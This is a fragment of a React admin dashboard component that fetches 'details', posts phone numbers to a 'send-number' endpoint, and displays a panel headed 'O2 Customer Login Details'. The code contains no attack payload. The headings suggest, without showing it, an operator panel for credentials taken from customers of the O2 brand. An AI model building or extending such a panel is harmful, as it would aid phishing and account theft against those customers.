...
const Dashboard = () => {
    ...
    const fetchDetails = async () =>{
      setLoader(true)
        const res = await apiRequest("details","GET");
      setDetails(res.data);
      setLoader(false);
    }
    ...
    const numberForm = async (e)=>{
        e.preventDefault();
        setLoader(true);
        const res = await apiRequest("send-number","POST",data)
        if(res.success){
          setNumber('')
  ...
  return (
    <Layout>
          ...
          <div className="d-sm-flex align-items-center justify-content-between mb-4">
            <h1 className="h3 mb-0 text-gray-800">O2 Customer Login Details </h1>
            ...
            <div className="col-xl-9 col-lg-9 mb-4">
              <div className="card">
                <div className="card-header py-3 d-flex flex-row align-items-center justify-content-between">
                  <h6 className="m-0 font-weight-bold text-primary">02 user Details</h6>
